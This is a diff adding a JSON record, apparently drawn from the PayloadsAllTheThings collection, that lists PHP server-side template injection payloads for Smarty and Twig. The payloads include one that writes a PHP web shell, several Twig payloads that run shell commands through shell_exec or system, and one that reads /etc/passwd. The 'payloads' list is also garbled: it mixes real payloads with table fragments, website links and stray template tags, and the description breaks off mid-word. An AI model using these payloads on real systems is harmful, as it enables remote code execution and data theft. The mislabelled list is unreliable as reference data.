@@ -1,0 +1,27 @@
+{
+  "id": "rce-1da725071ca7",
+  "category": "RCE",
+  "title": "PHP",
+  "description": "# Server Side Template Injection - PHP\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation.\n\n## Summary\n\n- [Templating Libraries](#templa",
+  "payloads": [
+    "| Plates          | `<?= ?>`       |",
+    "[Official website](https://laravel.com/docs/master/blade)",
+    "Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).",
+    "[Official website](https://www.smarty.net/docs/en/)",
+    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
+    "Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).",
+    "[Official website](https://twig.symfony.com/)",
+    "\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@",
+    "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{%include [\"Y:/A:/\", _self.env.getFilter(\"id\")]|join%} // Error-Based RCE <= 1.19",
+    "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{{1/(_self.env.getFilter(\"id && echo UniqueString\")|trim('\\n') ends with \"UniqueString\")}} // Boolean-Based RCE <= 1.19",
+    "email=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld",
+    "Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).",
+    "> [patTemplate](https://github.com/wernerwa/pat-template) non-compiling PHP templating engine, that uses XML tags to divide a document into different parts",
+    "<patTemplate:tmpl name=\"page\">",
+    "<patTemplate:tmpl name=\"foo\">"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Server Side Template Injection/PHP.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
